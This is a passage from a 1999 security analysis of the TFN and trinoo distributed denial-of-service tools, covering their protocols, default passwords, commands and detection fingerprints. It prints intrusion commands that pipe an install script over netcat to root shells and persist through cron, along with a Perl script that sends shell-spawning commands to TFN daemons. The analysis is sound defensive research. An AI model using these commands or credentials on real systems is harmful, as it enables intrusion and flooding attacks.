+	12345
+-----------------------------------------------------------------
+Packet 2
+ICMP Header
+	Type:				echo-reply
+	Checksum:			0x6CAE
+	Id:				0x007B
+	Sequence:			0x0000
+ICMP Data
+	shell bound to port 12345
+----------------------------------------------------------------------------
+
+As can be seen here, the client sends the command 0x01C8 (decimal 456)
+in the id field, followed by a sequence number of 0x0000 (it is always
+zero in the code), followed by the NULL terminated ASCII string
+"12345" (specified port number) is sent to the daemon.
+
+The daemon responds with the command reply 0x007B (decimal 123) in the
+id field, followed by a sequence number of 0x0000, followed by the
+NULL terminated ASCII string "shell bound to port 12345\n".  This
+string is then echoed to the shell by the client, with the daemon's IP
+address prepended.
+
+
+Defenses
+--------
+
+Because the programs use ICMP_ECHOREPLY packets for communication,
+it will be very difficult (if not impossible) to block it without
+breaking most Internet programs that rely on ICMP.  The Phrack
+paper on LOKI states:
+
+	The only sure way to destroy this channel is to deny ALL
+	ICMP_ECHO traffic into your network.
+
+Short of rejecting this traffic, it will instead be necessary to observe
+the difference between "normal" use of ICMP_ECHO and ICMP_ECHOREPLY
+packets by programs like "ping".  This will not be an easy task,
+especially on large networks.  (See the LOKI paper for more details.)
+
+
+Weaknesses
+----------
+
+If the source has not been modified, you can identify TFN clients and
+daemons by observing the strings embedded in the program binary:
+
+------------------------------------------------------------------------------
+# strings - td
+ . . .
+%d.%d.%d.%d
+/bin/sh
+tfn-daemon
+already %s flooding
+multiple targets
+ICMP flood: %s
+tfn-child
+SMURF (target@bcast@...): %s
+UDP flood: %s
+SYN flood: port %d, multiple targets
+SYN flood: port %d, %s
+ready - size: %d spoof: %d
+%s flood terminated
+packet size: %d bytes
+spoof mask: *.*.*.* (%s)
+spoof mask: 1.*.*.* (%s)
+spoof mask: 1.1.*.* (%s)
+spoof mask: 1.1.1.* (%s)
+spoof test: %s
+shell bound to port %s
+ . . .
+[0;35m[tribe flood network]
+ (c) 1999 by 
+[5mMixter
+ICMP
+SMURF
+ . . .
+
+# strings - tfn
+ . . .
+%d.%d.%d.%d
+ERROR reading IP list
+[1;37m
+[request: change packet size]
+[request: change spoofmask]
+[request: stop and display status]
+[request: udp flood %s]
+[request: syn flood [port: %s] %s]
+[request: icmp flood %s]
+[request: bind shell to port %s]
+[request: smurf (target@bcast@...) %s]
+[0;0m
+[0m%s: 
+[0;31m
+[0;34mtimeout
+[1;34m
+usage: %s &lt;iplist> &lt;type> [ip] [port]
+&lt;iplist>     contains a list of numerical hosts that are ready to flood
+&lt;type>       -1 for spoofmask type (specify 0-3), -2 for packet size,
+             is 0 for stop/status, 1 for udp, 2 for syn, 3 for icmp,
+             4 to bind a rootshell (specify port)
+             5 to smurf, first ip is target, further ips are broadcasts
+[ip]         target ip[s], separated by %s if more than one
+[port]       must be given for a syn flood, 0 = RANDOM
+skipping
+[0;35m[tribe flood network]
+ (c) 1999 by 
+[5mMixter
+ . . .
+------------------------------------------------------------------------------
+
+More recent binaries (shown earlier) include strings that indicate the
+newer code now has multi-master (instead of single client) capabilities,
+like trinoo, and encryption of (presumably) the iplist file, list of
+masters, and possibly even encryption of the data portion of the ICMP
+packets.
+
+The newer binaries recovered also show use of the Berkeley "rcp"
+command.  Monitoring "rcp" connections (514/tcp) from multiple systems
+on your network, in quick succession, to a single IP address outside
+your network would be a good trigger. (Note that the use of "rcp" in a
+this form requires an anonymous trust relationship, usually in the
+form of "+ +" in a user's ~/.rhosts file, which also will allow you to
+immediately archive the contents of this account while contacting the
+owners to preserve evidence.)
+
+Since TFN uses ICMP packets, it is much more difficult to detect in
+action, and packets will go right through most firewalls.  Programs
+like "ngrep" do not process ICMP packets, so you will not as easily
+(at this point in time) be able to watch for strings in the data
+portion of the ICMP packets.
+
+One weakness in TFN is that it does no authentication of the source
+of ICMP packets (at least not in the code used for this analysis).
+If the command value has not been changed from the default, only one
+packet would be necessary to flush out a daemon.  (A Perl script using
+Net::RawIP named "civilize" has been developed to accomplish this task.
+See Appendix C).
+
+If the command values had been changed, you could still brute force
+attack the daemon by sending all combinations of three digit values
+(the id field is 16 bits, so the actual maximum should be 64K).
+While this would almost constitute an ICMP flood attack in its own
+right, it is still a potential weakness that can be exploited.
+
+
+The next logical evolutionary steps
+-----------------------------------
+
+For more on the expected evolution of distributed denial of service
+tools, see the analysis of the trinoo network.
+
+--
+David Dittrich &lt;dittrich@cac.washington.edu>
+http://staff.washington.edu/dittrich/
+
+
+
+Appendix A: Patches to sniffit v. 0.3.7.beta to display ICMP data payload
+-------------------------------------------------------------------------
+
+-------------------------------  cut here  -----------------------------------
+diff -c sniffit.0.3.7.beta.orig/sn_defines.h sniffit.0.3.7.beta/sn_defines.h
+*** sniffit.0.3.7.beta.orig/sn_defines.h	Wed Aug 26 12:21:23 1998
+--- sniffit.0.3.7.beta/sn_defines.h	Wed Oct 20 10:15:41 1999
+***************
+*** 126,132 ****
+  #define ICMP_TYPE_3     "Destination unreachable"
+  #define ICMP_TYPE_4     "Source quench"
+  #define ICMP_TYPE_5     "Redirect"
+! #define ICMP_TYPE_8     "Echo"
+  #define ICMP_TYPE_11    "Time exceeded"
+  #define ICMP_TYPE_12    "Parameter problem"
+  #define ICMP_TYPE_13    "Timestamp"
+--- 126,132 ----
+  #define ICMP_TYPE_3     "Destination unreachable"
+  #define ICMP_TYPE_4     "Source quench"
+  #define ICMP_TYPE_5     "Redirect"
+! #define ICMP_TYPE_8     "Echo request"
+  #define ICMP_TYPE_11    "Time exceeded"
+  #define ICMP_TYPE_12    "Parameter problem"
+  #define ICMP_TYPE_13    "Timestamp"
+***************
+*** 134,140 ****
+  #define ICMP_TYPE_15    "Information request"
+  #define ICMP_TYPE_16    "Information reply"
+  #define ICMP_TYPE_17    "Address mask request"
+! #define ICMP_TYPE_18    "Adress mask reply"
+                                                 
+  /*** Services (standardised) *******************************************/
+  #define FTP_DATA_1	20
+--- 134,140 ----
+  #define ICMP_TYPE_15    "Information request"
+  #define ICMP_TYPE_16    "Information reply"
+  #define ICMP_TYPE_17    "Address mask request"
+! #define ICMP_TYPE_18    "Address mask reply"
+                                                 
+  /*** Services (standardised) *******************************************/
+  #define FTP_DATA_1	20
+diff -c sniffit.0.3.7.beta.orig/sniffit.0.3.7.c sniffit.0.3.7.beta/sniffit.0.3.7.c
+*** sniffit.0.3.7.beta.orig/sniffit.0.3.7.c	Wed Aug 26 12:21:25 1998
+--- sniffit.0.3.7.beta/sniffit.0.3.7.c	Wed Oct 20 10:15:49 1999
+***************
+*** 1333,1339 ****
+  	  printf ("Unknown ICMP type!\n");
+  	  break;
+  	}
+!       printf ("\n");
+        return;
+      }
+    if (finish &lt; 30)		/* nothing yet */
+--- 1333,1351 ----
+  	  printf ("Unknown ICMP type!\n");
+  	  break;
+  	}
+!         total_length = info.IP_len + info.ICMP_len + info.DATA_len;
+! 	n = 0;
+! 	for (i = 0; i &lt; total_length; i++)
+! 	  {
+! 	    unsigned char c = sp[PROTO_HEAD + i];
+! 	    if (n > 75)
+!               n = 0, printf ("\n");
+! 	    if (DUMPMODE & 1)
+!               n += printf (" %02X", c);
+! 	    if (DUMPMODE & 2)
+!               n += printf (" %c", isprint (c) ? c : '.');
+!         }
+!       printf ("\n\n");
+        return;
+      }
+    if (finish &lt; 30)		/* nothing yet */
+-------------------------------  cut here  -----------------------------------
+
+
+Appendix B: Patches to tcpshow 1.0 to display ICMP ECHO id/seq
+----------------------------------------------------------------------
+
+-------------------------------  cut here  -----------------------------------
+diff -c tcpshow.c.orig tcpshow.c
+*** tcpshow.c.orig	Thu Oct 21 14:12:19 1999
+--- tcpshow.c		Thu Oct 21 14:22:34 1999
+***************
+*** 1081,1086 ****
+--- 1081,1088 ----
+     uint2 nskipped;
+     uint1 type;
+     char *why;
++    uint2 echo_id;
++    uint2 echo_seq;
+  
+  
+     type = getbyte(&pkt);  nskipped  = sizeof(type);
+***************
+*** 1091,1096 ****
+--- 1093,1103 ----
+     /* Must calculate it from the size of the IP datagram - the IP header.   */
+     datalen -= ICMPHDRLEN;
+  
++    if (type == ECHO_REQ || type == ECHO_REPLY) {
++       echo_id = getword(&pkt); nskipped += sizeof(cksum);
++       echo_seq = getword(&pkt); nskipped += sizeof(cksum);
++    }
++ 
+     why = icmpcode(type, code);
+     if (dataflag) {
+        printf(
+***************
+*** 1113,1118 ****
+--- 1120,1129 ----
+  	 icmptype(type), why? "\n\tBecause:\t\t\t": "", why? why: ""
+        );
+        printf("\tChecksum:\t\t\t0x%04X\n", cksum);
++       if (type == ECHO_REQ || type == ECHO_REPLY) {
++          printf("\tId:\t\t\t\t0x%04X\n", echo_id);
++          printf("\tSequence:\t\t\t0x%04X\n", ntohs(echo_seq));
++       }
+     }
+  
+     return pkt;
+-------------------------------  cut here  -----------------------------------
+
+
+Appendix C - Perl script "civilize" to control TFN daemons
+----------------------------------------------------------
+
+-------------------------------  cut here  -----------------------------------
+#!/usr/bin/perl
+#
+# civilize v. 1.0
+# By Dave Dittrich &lt;dittrich@cac.washington.edu>
+# 
+# Send commands to TFN daemon(s), causing them to do things like
+# spawn shells, stop floods and report status, etc.  Using this program
+# (and knowledge of the proper daemon "passwords"), you can affect TFN
+# daemons externally and monitor packets to verify if a daemon is
+# running, etc.  You can also brute force attack the "passwords" by
+# sending packets until you get the desired reply (or give up.)
+#
+# Needs Net::RawIP (http://quake.skif.net/RawIP)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+#
+# Example: ./civilize [options] host1 [host2 [...]]
+#
+# (This code was hacked from the "macof" program, written by
+# Ian Vitek &lt;ian.vitek@infosec.se>)
+
+require 'getopts.pl';
+use Net::RawIP;
+require 'netinet/in.ph';
+
+$a = new Net::RawIP({icmp => {}});
+chop($hostname = `hostname`);
+
+Getopts('a:c:f:i:vh');
+die "usage: $0 [options] iplist\
+\t-a arg\t\tSend command argument 'arg' (default \"12345\")\
+\t-c val\t\tSend command value 'val' (default 456 - spawn a shell)\
+\t-f from_host\t\t(default:$hostname)\
+\t-i interface \t\tSet sending interface (default:eth0)\
+\t-v\t\t\tVerbose\
+\t-h This help\n" unless ( !$opt_h );
+
+# set default values
+$opt_i = ($opt_i) ? $opt_i : "eth0";
+$opt_a = ($opt_a) ? $opt_a : "12345";
+$opt_c = ($opt_c) ? $opt_c : "456";
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+$s_host = ($opt_h) ? $opt_h : $hostname;
+
+if ($ARGV[0]) {
+  open(I,"&lt;$ARGV[0]") || die "could not open file: '$ARGV[0]'";
+  while (&lt;I>) {
+    chop;
+    push(@list,$_);
+  }
+  close(I);
+}
+
+# Put value in network byte order (couldn't get htons() in
+# "netinet/in.ph" to work. Go figure.)
+$id = unpack("S", pack("n", $opt_c));
+
+foreach $d_host (@list) {
+  $a->set({ip => {saddr => $s_host, daddr => $d_host},
+           icmp => {type => 0, id => $id, data => "$opt_a\0"}
+          });
+  print "sending packet [$opt_c/$opt_a] to $d_host\n" if $opt_v;
+  $a->send;
+}
+
+exit(0);
+-------------------------------  cut here  -----------------------------------
+
+
+Appendix D - References
+-----------------------
+
+TCP/IP Illustrated, Vol. I, II, and III. W. Richard Stevens and Gary
+R. Wright., Addison-Wesley.
+
+tcpdump:
+	ftp://ftp.ee.lbl.gov/tcpdump.tar.Z
+
+tcpshow:
+	http://packetstorm.securify.com/linux/trinux/src/tcpshow.c
+
+sniffit:
+	http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+ngrep:
+	http://www.packetfactory.net/ngrep/
+
+loki client/server:
+	Phrack Magazine, Volume Seven, Issue Forty-Nine,
+	File 06 of 16, [ Project Loki ]
+	http://www.phrack.com/search.phtml?view&article=p49-6
+
+	Phrack Magazine  Volume 7, Issue 51 September 01, 1997,
+	article 06 of 17 [ L O K I 2   (the implementation) ]
+	http://www.phrack.com/search.phtml?view&article=p51-6
+
+Net::RawIP:
+	http://quake.skif.net/RawIP
+----------------------------------------------------------------------------
+                                 
+            
+
+
+       <a name="trinoo"></a><hr>
+==========================================================================
+
+  The DoS Project's "trinoo" distributed denial of service attack tool
+
+==========================================================================
+
+David Dittrich &lt;dittrich@cac.washington.edu>
+University of Washington
+Copyright 1999. All rights reserved.
+October 21, 1999
+
+
+Introduction
+------------
+
+The following is an analysis of the DoS Project's "trinoo" (a.k.a.
+"trin00") master/slave programs, which implement a distributed
+network denial of service tool.
+
+Trinoo daemons were originally found in binary form on a number of
+Solaris 2.x systems, which were identified as having been compromised
+by exploitation of buffer overrun bugs in the RPC services "statd",
+"cmsd" and "ttdbserverd".  These attacks are described in CERT
+Incident Note 99-04:
+
+	http://www.cert.org/incident_notes/IN-99-04.html
+
+The trinoo daemons were originally believed to be UDP based,
+access-restricted remote command shells, possibly used in conjunction
+with sniffers to automate recovering sniffer logs.
+
+During investigation of these intrusions, the installation of a trinoo
+network was caught in the act and the trinoo source code was obtained
+from the account used to cache the intruders' tools and log files.
+This analysis was done using this recovered source code.
+
+Modification of the source code would change any of the details
+in this analysis, such as prompts, passwords, commands, TCP/UDP port
+numbers, or supported attack methods, signatures, and features.
+
+The daemon was compiled and run on Solaris 2.5.1 and Red Hat Linux 6.0
+systems.  The master was compiled and run on Red Hat Linux 6.0.  It is
+believed that both master and daemon have been witnessed "in the
+wild" on these same platforms.
+
+Trinoo networks are probably being set up on hundreds, perhaps
+thousands, of systems on the Internet that are being compromised by
+remote buffer overrun exploitation.  Access to these systems is
+probably being perpetuated by the installation of multiple "back
+doors" along with the trinoo daemons.
+
+A trinoo network of at least 227 systems -- 114 of these at Internet2
+sites -- was used on August 17, 1999 to flood a single system at the
+University of Minnessota, swamping the target network and rendering it
+unusable for over two days.  While responding to this attack, large
+flows were also noticed going to at least sixteen other systems, some
+outside the US.  (See Appendix D for a report of part of this trinoo
+attack.) 
+
+
+Attack scenario
+---------------
+
+A typical installation might go something like this.
+
+1).  A stolen account is set up as a repository for pre-compiled
+versions of scanning tools, attack (i.e. buffer overrun exploit)
+tools, root kits and sniffers, trinoo daemon and master programs,
+lists of vulnerable hosts and previously compromised hosts, etc.  This
+would normally be a large system with many users, one with little
+administrative oversight, and on a high-bandwidth connection for rapid
+file transfer.
+
+2).  A scan is performed of large ranges of network blocks to identify
+potential targets.  Targets would include systems running various
+services known to have remotely exploitable buffer overflow security
+bugs, such as wu-ftpd, RPC services for "cmsd", "statd",
+"ttdbserverd", "amd", etc.  Operating systems being targeted appear to
+be primarily Sun Solaris 2.x and Linux (due to the ready availability
+of network sniffers and "root kits" for concealing back doors, etc.),
+but stolen accounts on any architecture can be used for caching tools
+and log files.
+
+3).  A list of vulnerable systems is then used to create a script that
+performs the exploit, sets up a command shell running under the root
+account that listens on a TCP port (commonly 1524/tcp, the
+"ingreslock" service port), and connects to this port to confirm the
+success of the exploit.  In some cases, an electronic mail message is
+sent to an account at a free web based email service to confirm which
+systems have been compromised.
+
+The result is a list of "owned" systems ready for setting up
+back doors, sniffers, or the trinoo daemons or masters.
+
+4). From this list of compromised systems, subsets with the desired
+architecture are chosen for the trinoo network.  Pre-compiled binaries
+of the trinoo daemon are created and stored on a stolen account
+somewhere on the Internet.
+
+5). A script is then run which takes this list of "owned" systems and
+produces yet another script to automate the installation process,
+running each installation in the background for maximum multitasking.
+
+This script uses "netcat" ("nc") to pipe a shell script to the root
+shell listening on, in this case, port 1524/tcp:
+
+---------------------------------------------------------------------------
+./trin.sh | nc 128.aaa.167.217 1524 &
+./trin.sh | nc 128.aaa.167.218 1524 &
+./trin.sh | nc 128.aaa.167.219 1524 &
+./trin.sh | nc 128.aaa.187.38 1524 &
+./trin.sh | nc 128.bbb.2.80 1524 &
+./trin.sh | nc 128.bbb.2.81 1524 &
+./trin.sh | nc 128.bbb.2.238 1524 &
+./trin.sh | nc 128.ccc.12.22 1524 &
+./trin.sh | nc 128.ccc.12.50 1524 &
+ . . .
+---------------------------------------------------------------------------
+
+The script "trin.sh", whose output is being piped to these systems,
+looks like:
+
+---------------------------------------------------------------------------
+echo "rcp 192.168.0.1:leaf /usr/sbin/rpc.listen"
+echo "echo rcp is done moving binary"
+
+echo "chmod +x /usr/sbin/rpc.listen"
+
+echo "echo launching trinoo"
+echo "/usr/sbin/rpc.listen"
+
+echo "echo \* \* \* \* \* /usr/sbin/rpc.listen > cron"
+echo "crontab cron"
+echo "echo launched"
+echo "exit"
+---------------------------------------------------------------------------
+
+Depending on how closely crontab files are monitored, or if they are
+used at all, this may be detected easily.  If cron is not used at all
+by this user (usually root), it may not be detected at all.
+
+Another method was witnessed on at least one other system, where the
+daemon was named "xterm", and was started using a script (named "c" on
+the system on which it was found) that contains:
+
+---------------------------------------------------------------------------
+cd /var/adm/.1
+PATH=.:$PATH
+export PATH
+xterm 1>/dev/null 2>&1
+---------------------------------------------------------------------------
+
+This would supposedly imply a method of running this script on demand
+to set up the trinoo network.
+
+Even more subtle ways of having trinoo daemons/masters lie in wait for
+execution at a given time are easy to envision (e.g., UDP or ICMP
+based client/server shells, such as LOKI (see Appendix C) , programs
+that wake up periodically and open a listening TCP or UDP port, etc.)
+
+The result of this automation is the ability for attackers to set up
+the denial of service network, on widely dispersed systems whose true
+owners don't even know are out of their control, in a very short time
+frame.
+
+6).  Optionally, a "root kit" is installed on the system to hide the
+presence of programs, files, and network connections.   This is more
+important on the master system, since these systems are key to the
+trinoo network. (It should be noted that in many cases, masters have
+been set up on Internet Service Providers' primary name server hosts,
+which would normally have extremely high packet traffic and large
+numbers of TCP and UDP connections, which would effectively hide any
+trinoo related traffic or activity, and would likely not be detected.
+(The fact that these are primary name servers would also tend to make
+the owners less likely to take the system off the Internet when
+reports begin to come in about suspected denial of service related
+activity.)
+
+Root kits would also be used on systems running sniffers that, along
+with programs like "hunt" (TCP/IP session hijacking tool) are used to
+burrow further into other networks directly, rather than through
+remote buffer overrun exploits (e.g., to find sites to set up new file
+repositories, etc.)
+
+For more on "root kits" and some ways to get around them, see:
+
+	http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq
+
+
+The network: attacker(s)-->master(s)-->daemon(s)-->victim(s)
+------------------------------------------------------------
+
+The trinoo network is made up of a master server ("master.c") and the
+trinoo daemon ("ns.c").  A trinoo network would look like this:
+
+
+                  +----------+           +----------+
+                  | attacker |           | attacker |
+                  +----------+           +----------+
+                       |                      |
+        . . . --+------+---------------+------+----------------+-- . . .
+                |                      |                       |
+                |                      |                       |
+           +----------+           +----------+            +----------+
+           |  master  |           |  master  |            |  master  |
+           +----------+           +----------+            +----------+
+                |                      |                       |
+                |                      |                       |
+. . . ---+------+-----+------------+---+--------+------------+-+-- . . .
+         |            |            |            |            |
+         |            |            |            |            |
+     +--------+   +--------+   +--------+   +--------+   +--------+
+     | daemon |   | daemon |   | daemon |   | daemon |   | daemon |
+     +--------+   +--------+   +--------+   +--------+   +--------+
+
+
+The attacker(s) control one or more "master" servers, each of which
+can control many "daemons" (known in the code as "Bcast", or
+"broadcast" hosts.)  The daemons are all instructed to coordinate a
+packet based attack against one or more victim systems.
+
+All that is then needed is the ability to establish a TCP connection
+to the master hosts using "telnet" and the password to the master
+server to be able to wage massive, coordinated, denial of service
+attacks.
+
+
+Communication ports
+-------------------
+
+    Attacker to Master(s):	27665/tcp
+    Master to daemon(s):	27444/udp
+    Daemon to Master(s):	31335/udp
+
+Remote control of the trinoo master is accomplished via a TCP
+connection to port 27665/tcp.  After connecting, the user must give
+the proper password ("betaalmostdone").  If another connection is made
+to the server while someone is already authenticated, a warning is
+sent to them with the IP address of the connecting host (it appears
+there is a bug that reports incorrect IP addresses, but a warning is
+still communicated).  This will no doubt be fixed eventually and will
+then give the attackers time to clean up and cover their tracks.
+
+Communication from the trinoo master to daemons is via UDP packets
+on port 27444/udp.  Command lines are space separated lines of the
+form:
+
+	arg1 password arg2
+
+The default password for commands is "l44adsl", and only command lines
+that contain the substring "l44" are processed.
+
+Communication from the trinoo daemons and the master is via UDP
+packets on port 31335/udp.
+
+When the daemon starts, it initially sends "*HELLO*" to the master,
+which maintains a list of active daemons that it controls (packet
+captured using "sniffit"):
+
+UDP Packet ID (from_IP.port-to_IP.port): 192.168.0.1.32876-10.0.0.1.31335
+ 45 E 00 . 00 . 23 # B1 . 5D ] 40 @ 00 . F8 . 11 . B9 . 27 . C0 . A8 . 00 . 01 .
+ 0A . 00 . 00 . 01 . 80 . 6C l 7A z 67 g 00 . 0F . 06 . D4 . 2A * 48 H 45 E 4C L
+ 4C L 4F O 2A *
+
+If the trinoo master sends a "png" command to a daemon on port
+27444/udp, the daemon will reply to the server that just sent the "png"
+command by sending the string "PONG" on port 31335/udp:
+
+UDP Packet ID (from_IP.port-to_IP.port): 10.0.0.1.1024-192.168.0.1.27444
+ 45 E 00 . 00 . 27 ' 1A . AE . 00 . 00 . 40 @ 11 . 47 G D4 . 0A . 00 . 00 . 01 .
+ C0 . A8 . 00 . 01 . 04 . 00 . 6B k 34 4 00 . 13 . 2F / B7 . 70 p 6E n 67 g 20  
+ 6C l 34 4 34 4 61 a 64 d 73 s 6C l
+
+UDP Packet ID (from_IP.port-to_IP.port): 192.168.0.1.32879-10.0.0.1.31335
+ 45 E 00 . 00 . 20   13 . 81 . 40 @ 00 . F8 . 11 . 57 W 07 . C0 . A8 . 00 . 01 .
+ 0A . 00 . 00 . 01 . 80 . 6F o 7A z 67 g 00 . 0C . 4E N 24 $ 50 P 4F O 4E N 47 G
+
+
+Password protection
+-------------------
+
+Both the master and daemons are password protected to prevent
+system administrators (or other hacker groups) from being able to take
+control of the trinoo network.  These passwords are crypt() style
+passwords.  They are used in a symmetric fashion, where the encrypted
+password is compiled into the master and daemons and used to compare
+against the clear-text version of the password that is sent over the
+network (the current version does not encrypt the actual session, so the
+clear-text passwords are exposed in transit and the master control
+sessions are subject to TCP session highjacking).
+
+When initially run, the master daemon produces a prompt, waiting
+for a password.  If the proper password is not received, the program
+exits.  If the proper password is given, the process announces its
+execution, forks to continue running in the background, and exits:
+
+    # ./master
+    ?? wrongpassword
+    # 
+      . . .
+
+    # ./master
+    ?? gOrave
+    trinoo v1.07d2+f3+c [Sep 26 1999:10:09:24]
+    # 
+
+Likewise, when you connect to the remote command port (default
+27665/tcp), you must also give a password:
+
+    attacker$ telnet 10.0.0.1 27665
+    Trying 10.0.0.1
+    Connected to 10.0.0.1
+    Escape character is '^]'.
+    kwijibo
+    Connection closed by foreign host.
+     . . .
+
+    attacker$ telnet 10.0.0.1 27665
+    Trying 10.0.0.1
+    Connected to 10.0.0.1
+    Escape character is '^]'.
+    betaalmostdone
+    trinoo v1.07d2+f3+c..[rpm8d/cb4Sx/]
+
+
+    trinoo>
+
+Certain commands sent to the trinoo daemons by the master are also
+password protected.  This password is sent in clear text between the
+master and daemons.
+
+The default passwords were:
+
+    "l44adsl"		trinoo daemon password
+    "gOrave"		trinoo master server startup ("?? " prompt)
+    "betaalmostdone"	trinoo master remote interface password
+    "killme"		trinoo master password to control "mdie" command
+
+
+Master commands
+---------------
+
+The trinoo master supports the following commands:
+ 
+  die		Shut down the master.
+
+  quit		Log off the master.
+
+  mtimer N	Set DoS timer to N seconds.  N can be between 1 and 1999
+		seconds. If N is &lt; 1, it defaults to 300. If N
+ 		is > 2000, it defaults to 500.
+
+  dos IP	DoS the IP address specified.  A command ("aaa l44adsl
+		IP") is sent to each Bcast host (i.e., trinoo daemons)
+		telling them to DoS the specified IP address.
+
+  mdie pass	Disable all Bcast hosts, if the correct password is
+		specified. A command is sent ("d1e l44adsl") to each
+		Bcast host telling them to shut down.  A separate
+		password is required for this command.
+
+  mping		Send a PING command ("png l44adsl") to every active
+  		Bcast host.
+
+  mdos &lt;ip1:ip2:ip3>
+  		Multiple DoS.  Sends a multiple DoS command
+		("xyz l44adsl 123:ip1:ip2:ip3") to each Bcast host.
+
+  info		Print version and compile information, e.g.:
+  
+     This is the "trinoo" AKA DoS Project master server version v1.07d2+f3+c
+     Compiled 15:08:41 Aug 16 1999
+
+  msize		Set the buffer size for packets sent during DoS attacks.
+
+  nslookup host	Do a name service lookup of the specified host from
+  		the perspective of the host on which the master
+		server is running.
+
+  killdead	Attempts to weed out all dead Bcast hosts by first
+		sending all known Bcast hosts a command ("shi l44adsl")
+		that causes any active daemons to reply with the initial
+		"*HELLO*" string, then renames the Bcast file (with
+		extension "-b") so it will be re-initialized when the
+		"*HELLO*" packets are received.
+
+  usebackup	Switch to the backup Bcast file created by the
+		"killdead" command.
+
+  bcast		List all active Bcast hosts.
+
+  help [cmd]	Give a (partial) list of commands, or a brief
+		description of the command "cmd" if specified.
+
+  mstop		Attempts to stop a DoS attack (not implemented, but
+		listed in the help command).
+
+
+Daemon commands
+---------------
+
+The trinoo daemon supports the following commands:
+
+  aaa pass IP	DoS the specified IP address.  Sends UDP packets to random
+		(0-65534) UDP ports on the specified IP addresses for
+		a period of time (default is 120 seconds, or 1 - 1999
+		seconds as set by the "bbb" command.)  The size of the
+		packets is that set by the "rsz" command, or the default
+		size of 1000 bytes.
+
+  bbb pass N	Sets time limit (in seconds) for DoS attacks.
+
+  shi pass	Sends the string "*HELLO*" to the list of master servers
+		compiled into the program on port 31335/udp.
+
+  png pass	Sends the string "PONG" to the master that issued the
+		the command on port 31335/udp.
+
+  d1e pass	Shut down the trinoo daemon.
+
+  rsz N		Set size of buffer for DoS attacks to N bytes.
+  		(The trinoo daemon simply malloc()s a buffer with this
+		size, then sends the uninitialized contents of the
+		buffer during an attack.)
+
+  xyz pass 123:ip1:ip2:ip3
+		Multiple DoS.  Does the same thing as the "aaa"
+		command, but for multiple IP addresses.
+
+It could be coincidence, but I will give the author some credit and
+assume that three letter commands were chosen so they don't show up in
+the binary as visible strings under the default behavior of
+STRINGS(1).  You must use the "--bytes=3" option of GNU STRINGS(1) to
+see the commands:
+
+	# strings --bytes=3 ns | tail -15
+	socket
+	bind
+	recvfrom
+	l44
+	%s %s %s
+	aIf3YWfOhw.V.
+	aaa
+	bbb
+	shi
+	png
+	PONG
+	d1e
+	rsz
+	xyz
+	*HELLO*
+
+
+Fingerprints
+------------
+
+The method used to install the trinoo daemon on some systems employs
+a crontab entry to start the daemon every minute.  Examining crontab
+files would locate this entry:
+
+    * * * * * /usr/sbin/rpc.listen
+
+The master program creates a file (default name "...") containing the
+set of Bcast hosts.  If the command "killdead" is used, an "shi" command
+is sent to all daemons listed in "...", which causes them to send the
+initial "*HELLO*" string to all masters. The current list is renamed
+(default "...-b") and a new list is then generated as each remaining
+live daemon sends its "*HELLO*".
+
+The source code ("master.c") contains the following lines:
+
+------------------------------------------------------------------------------
+. . .
+/* crypt key encrypted with the key 'bored'(so hex edit cannot get key easily?)
+   comment out for no encryption... */
+#define CRYPTKEY "ZsoTN.cq4X31"
+. . .
+------------------------------------------------------------------------------
+
+If the program was compiled with CRYPTKEY defined, the IP addresses of
+Bcast hosts are encrypted using the Blowfish encryption algorithm:
+
+    # ls -l ... ...-b
+    -rw-------   1 root     root           25 Sep 26 14:46 ...
+    -rw-------   1 root     root           50 Sep 26 14:30 ...-b
+    # cat ...
+    JPbUc05Swk/0gMvui18BrFH/
+    # cat ...-b
+    aE5sK0PIFws0Y0EhH02fLVK.
+    JPbUc05Swk/0gMvui18BrFH/
+
+Assuming there is no "root kit" present to hide processes, the master
+server shows the following network socket fingerprints (of course, the
+names and directory locations of either program are subject to change):
+
+------------------------------------------------------------------------------
+# netstat -a --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 *:27665                 *:*                     LISTEN      
+. . .
+udp        0      0 *:31335                 *:*                                 
+. . .
+
+# lsof | egrep ":31335|:27665"
+master   1292     root    3u  inet       2460              UDP *:31335 
+master   1292     root    4u  inet       2461              TCP *:27665 (LISTEN)
+
+# lsof -p 1292
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+master  1292 root  cwd    DIR    3,1    1024 14356 /tmp/...
+master  1292 root  rtd    DIR    3,1    1024     2 /
+master  1292 root  txt    REG    3,1   30492 14357 /tmp/.../master
+master  1292 root  mem    REG    3,1  342206 28976 /lib/ld-2.1.1.so
+master  1292 root  mem    REG    3,1   63878 29116 /lib/libcrypt-2.1.1.so
+master  1292 root  mem    REG    3,1 4016683 29115 /lib/libc-2.1.1.so
+master  1292 root    0u   CHR    4,1          2967 /dev/tty1
+master  1292 root    1u   CHR    4,1          2967 /dev/tty1
+master  1292 root    2u   CHR    4,1          2967 /dev/tty1
+master  1292 root    3u  inet   2534           UDP *:31335 
+master  1292 root    4u  inet   2535           TCP *:27665 (LISTEN)
+------------------------------------------------------------------------------
+
+A system running a daemon would show the following:
+
+------------------------------------------------------------------------------
+# netstat -a --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+. . .
+udp        0      0 *:1024                  *:*                                 
+udp        0      0 *:27444                 *:*                                 
+. . .
+
+# lsof | egrep ":27444"
+ns       1316     root    3u  inet       2502              UDP *:27444 
+
+# lsof -p 1316
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE   NODE NAME
+ns      1316 root  cwd    DIR    3,1    1024 153694 /tmp/...
+ns      1316 root  rtd    DIR    3,1    1024      2 /
+ns      1316 root  txt    REG    3,1    6156 153711 /tmp/.../ns
+ns      1316 root  mem    REG    3,1  342206  28976 /lib/ld-2.1.1.so
+ns      1316 root  mem    REG    3,1   63878  29116 /lib/libcrypt-2.1.1.so
+ns      1316 root  mem    REG    3,1 4016683  29115 /lib/libc-2.1.1.so
+ns      1316 root    0u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    1u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    2u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    3u  inet   2502            UDP *:27444 
